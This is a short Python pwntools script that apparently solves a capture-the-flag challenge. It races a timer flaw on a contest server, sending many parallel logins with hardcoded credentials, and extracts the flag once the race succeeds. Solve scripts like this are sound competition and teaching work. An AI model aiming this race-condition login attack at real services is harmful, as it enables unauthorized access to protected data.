#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from multiprocessing import Pool
import random
import re
import time

from pwn import *

context.log_level = "error"

USER = "agent"
PASSWORD = "doNOTl4unch_missi1es!"

SECRET = """Stored secret:
---
Operation SIERRA TANGO ROMEO:
Radio frequency: 13.37MHz
Received message: ATTACK AT DAWN

---
"""


def get_flag(secret: str) -> str:
    if match := re.search(r"CTF{.+}", secret, re.MULTILINE):
        return match.group(0)

    raise ValueError("The given secret string does not contain the flag.")


def sei_race(_):
    while True:
        # Connect to the server and confirm the greeting.
        connection = remote("avr.2020.ctfcompetition.com", 1337)
        connection.sendafter(
            "Welcome to secret military database. Press ENTER to continue.", "\n"
        )

        # Wait for a random delay, hoping to get the timer close to overflowing, and send our credentials.
        time.sleep(random.random())

        # Check if we triggered the race condition and the flag was copied.
        connection.send(f"{USER}\n{PASSWORD}\n")
        connection.sendafter("Choice: ", "2\n")
        secret = connection.recvall().decode()
        if not secret.startswith(SECRET):
            print("Flag:", get_flag(secret))
            return True

        # Close the connection.
        connection.close()

        return False


with Pool(None) as pool:
    pool.map(sei_race, range(500))
